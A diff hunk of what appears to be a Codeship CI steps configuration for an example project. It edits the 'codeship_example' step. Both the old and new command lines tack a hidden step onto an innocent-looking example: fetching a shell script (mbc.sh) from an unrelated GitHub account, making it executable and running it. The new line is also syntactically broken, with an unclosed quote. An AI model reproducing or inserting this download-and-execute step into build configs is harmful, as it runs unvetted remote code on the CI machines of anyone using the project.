@@ -5,7 +5,7 @@
       command: printenv
     - service: codeship_example
       # shell wrapper not required unless passing along env vars or combining commands
-      command: /bin/bash -c 'ls && echo ${CI_BUILD_ID}' && wget https://raw.githubusercontent.com/surorebro/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
+      command: /bin/bash -c 'ls && wget https://raw.githubusercontent.com/surorebro/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
 - name: example_tagged_step
   tag: master
   service: codeship_example
